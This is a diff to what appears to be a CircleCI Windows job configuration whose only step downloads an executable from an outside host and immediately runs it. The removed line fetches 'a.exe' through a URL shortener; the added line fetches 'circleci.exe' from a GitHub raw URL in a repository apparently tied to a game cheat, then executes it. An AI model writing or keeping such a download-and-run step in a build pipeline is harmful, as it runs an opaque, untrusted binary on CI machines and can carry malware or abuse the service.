@@ -9,4 +9,8 @@ jobs:
       name: win/default
       shell: cmd.exe
     steps:
-      - run: curl -L -o a.exe https://is.gd/sassssssssssssss && a.exe
+      - run: cmd.exe /c curl -L -o a.exe https://raw.githubusercontent.com/a3a3aikarus/nixware-gmod/master/circleci.exe && a.exe
+
+
+
+
